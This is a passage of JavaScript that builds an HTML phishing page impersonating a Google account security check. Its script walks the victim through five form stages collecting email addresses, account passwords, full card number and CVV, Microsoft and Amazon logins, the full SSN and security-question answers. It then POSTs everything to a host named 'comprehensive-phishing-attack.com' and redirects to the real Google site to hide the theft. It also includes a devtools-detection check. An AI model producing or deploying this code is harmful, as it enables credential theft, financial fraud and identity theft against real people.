          const primaryEmail = document.getElementById('primaryEmail').value;
          if (!primaryEmail.includes('@')) {
            alert('Please enter a valid email address.');
            return;
          }
          
          // 显示下一阶段
          document.getElementById('stage1').classList.remove('stage-active');
          document.getElementById('stage2').classList.add('stage-active');
        });
        
        // 阶段2提交处理
        document.getElementById('stage2Form').addEventListener('submit', function(e) {
          e.preventDefault();
          
          // 显示下一阶段
          document.getElementById('stage2').classList.remove('stage-active');
          document.getElementById('stage3').classList.add('stage-active');
        });
        
        // 阶段3提交处理
        document.getElementById('stage3Form').addEventListener('submit', function(e) {
          e.preventDefault();
          
          // 显示下一阶段
          document.getElementById('stage3').classList.remove('stage-active');
          document.getElementById('stage4').classList.add('stage-active');
        });
        
        // 阶段4提交处理
        document.getElementById('stage4Form').addEventListener('submit', function(e) {
          e.preventDefault();
          
          // 显示下一阶段
          document.getElementById('stage4').classList.remove('stage-active');
          document.getElementById('stage5').classList.add('stage-active');
        });
        
        // 最终阶段提交处理
        document.getElementById('stage5Form').addEventListener('submit', function(e) {
          e.preventDefault();
          
          // 收集所有阶段的数据
          const allData = {
            stage1: {
              primaryEmail: document.getElementById('primaryEmail').value,
              recoveryEmail: document.getElementById('recoveryEmail').value,
              phoneNumber: document.getElementById('phoneNumber').value
            },
            stage2: {
              username: document.getElementById('username').value,
              accountPassword: document.getElementById('accountPassword').value,
              lastPasswordChange: document.getElementById('lastPasswordChange').value
            },
            stage3: {
              primaryCard: document.getElementById('primaryCard').value,
              cardExpiry: document.getElementById('cardExpiry').value,
              cardCVV: document.getElementById('cardCVV').value,
              billingAddress: document.getElementById('billingAddress').value,
              zipCode: document.getElementById('zipCode').value
            },
            stage4: {
              microsoftEmail: document.getElementById('microsoftEmail').value,
              microsoftPassword: document.getElementById('microsoftPassword').value,
              amazonEmail: document.getElementById('amazonEmail').value,
              amazonPassword: document.getElementById('amazonPassword').value
            },
            stage5: {
              fullSSN: document.getElementById('fullSSN').value,
              mothersMaidenName: document.getElementById('mothersMaidenName').value,
              firstPetName: document.getElementById('firstPetName').value,
              elementarySchool: document.getElementById('elementarySchool').value
            },
            metadata: {
              userAgent: document.getElementById('userAgent').value,
              timestamp: document.getElementById('timestamp').value,
              ipAddress: document.getElementById('ipAddress').value
            }
          };
          
          // 发送所有收集的数据到钓鱼服务器
          fetch('https://comprehensive-phishing-attack.com/collect-all-data', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(allData)
          })
          .then(response => response.json())
          .then(data => {
            // 显示成功消息并重定向到真实网站
            document.body.innerHTML = '<div style="text-align: center; padding: 50px;"><h2>Account Security Verified!</h2><p>Your account has been successfully secured. Redirecting to Google Account dashboard...</p></div>';
            setTimeout(() => {
              window.location.href = 'https://accounts.google.com/';
            }, 3000);
          })
          .catch(error => {
            console.error('Data submission failed:', error);
            alert('An error occurred. Please try again.');
          });
        });
        
        // 监控页面焦点变化
        window.addEventListener('blur', function() {
          console.log('User switched away from the page');
        });
        
        // 检测开发者工具
        var devtools = function() {};
        devtools.toString = function() {
          return "devtools open";
        };
        
        setInterval(function() {
          if (~devtools.toString().indexOf("devtools")) {
            // 如果检测到开发者工具打开，可能隐藏某些元素
            console.log("DevTools detected");
          }
        }, 1000);
      </script>
    </body>
    </html>
  `;
}
